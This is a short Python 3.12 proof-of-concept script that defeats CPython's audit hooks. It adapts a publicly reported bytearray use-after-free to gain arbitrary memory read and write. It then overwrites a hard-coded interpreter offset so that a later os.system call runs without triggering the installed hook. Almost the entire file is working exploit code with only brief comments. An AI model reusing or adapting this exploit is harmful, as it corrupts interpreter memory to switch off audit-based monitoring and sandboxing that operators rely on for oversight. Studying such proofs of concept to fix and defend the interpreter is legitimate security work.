#!/usr/bin/env python3.12
import ctypes, sys, os

sys.addaudithook((lambda x: lambda *_: x("audit hook triggered!"))(print))

obj = ctypes.byref(ctypes.py_object(()))

os.system("echo 'test audit hook -- this will trigger hook'")

# following arbitery reading/writing exploit code from https://github.com/python/cpython/issues/91153#issuecomment-1132117665
# by chilaxan
to_write_after_free = bytearray(bytearray.__basicsize__)
class sneaky:
    def __index__(self):
        global to_corrupt_ob_exports, to_uaf
        del to_write_after_free[:]
        to_corrupt_ob_exports = bytearray(bytearray.__basicsize__)
        to_write_after_free.__init__(bytearray.__basicsize__)
        to_uaf = memoryview(to_corrupt_ob_exports)
        return -tuple.__itemsize__

to_write_after_free[sneaky()] = 0
to_corrupt_ob_exports.clear()
occupy_uaf = bytearray()

view_backing = to_uaf.cast('P')
view = occupy_uaf

view_backing[2] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2
memory = memoryview(view)
# end of arbitery reading/writing exploit code

for i in range(0, 8):
    # the offsets are from POC.py: 
    # Python 3.11 = 0xe00
    # Python 3.12 = 0x41448
    memory[ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0x41448 + i] = 0

os.system("echo 'test audit hook -- this will not'")